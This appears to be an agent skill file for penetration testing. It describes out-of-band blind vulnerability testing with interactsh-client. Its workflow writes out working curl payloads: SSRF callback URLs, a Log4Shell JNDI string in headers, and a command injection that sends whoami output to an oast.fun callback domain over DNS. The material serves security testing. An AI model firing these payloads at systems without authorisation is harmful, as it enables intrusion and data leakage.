---
name: oast-blind-testing
description: Generates Out-of-Band (OAST) interaction payloads with interactsh-client to detect and confirm Blind SSRF, Blind RCE, and Out-of-Band data leakage.
---

# Out-Of-Band (OAST) Blind Testing Skill

## Purpose
Confirm high-severity asynchronous and blind vulnerabilities (Blind Server-Side Request Forgery, Blind Command Injection, Log4Shell, Blind XML External Entity) by listening for external DNS, HTTP, and SMTP callbacks using `interactsh-client`.

## Inputs
- Candidate SSRF parameters from `/workspace/output/parameters/<target>/ssrf.txt`
- Live web services from `/workspace/recon/<target>/httpx_live_*.txt`

## Workflow

### 1. Register OAST Session (interactsh-client)
Start an interactive or background `interactsh-client` session to obtain a unique listening domain:
```bash
# Generate a dedicated session and capture interaction logs
interactsh-client -v -json -o /workspace/output/oast_interactions.json &
INTERACT_PID=$!
sleep 3
```

*(Alternatively, run single-shot poll mode after payload injection).*

### 2. Inject Payloads across Common Blind Vectors

#### A. Blind SSRF in Parameters:
Inject the unique callback domain into identified query/body parameters:
```bash
CALLBACK_DOMAIN="<unique-subdomain>.oast.fun"

# Test HTTP & DNS callback
curl -s -m 5 "https://target.com/fetch?url=http://${CALLBACK_DOMAIN}/ssrf-test" || true
curl -s -m 5 "https://target.com/api/webhook" \
     -X POST \
     -H "Content-Type: application/json" \
     -d "{\"webhook_url\":\"http://${CALLBACK_DOMAIN}/webhook-test\"}" || true
```

#### B. Blind Header Injection (Log4j / Blind SSRF):
Inject callback domains into HTTP request headers:
```bash
curl -s -m 5 "https://target.com/" \
     -H "X-Forwarded-For: ${CALLBACK_DOMAIN}" \
     -H "X-Real-IP: ${CALLBACK_DOMAIN}" \
     -H "Referer: http://${CALLBACK_DOMAIN}/ref" \
     -H "User-Agent: \${jndi:ldap://${CALLBACK_DOMAIN}/log4j}" || true
```

#### C. Blind Command Injection (DNS Exfiltration):
Test out-of-band ping / nslookup commands:
```bash
curl -s -m 5 "https://target.com/api/lookup?host=\$(whoami).${CALLBACK_DOMAIN}" || true
```

### 3. Verification & Callback Inspection
Check `/workspace/output/oast_interactions.json` for incoming DNS queries (`protocol: "dns"`) or HTTP requests (`protocol: "http"`).

```bash
# Parse recorded interactions
grep -E '(dns|http)' /workspace/output/oast_interactions.json || true
```

## Output Artifacts
- `/workspace/output/oast_interactions.json` - Raw interaction callback logs containing client IP, protocol, and request headers.
- `/workspace/reports/oast_findings.md` - Confirmed blind vulnerability Proof of Concept.

## Safety Rules
- Include target identifier in the URL path (e.g. `http://<token>.oast.fun/target-id-123`) to definitively attribute the callback.
- Never use external callbacks for denial-of-service or flooding.
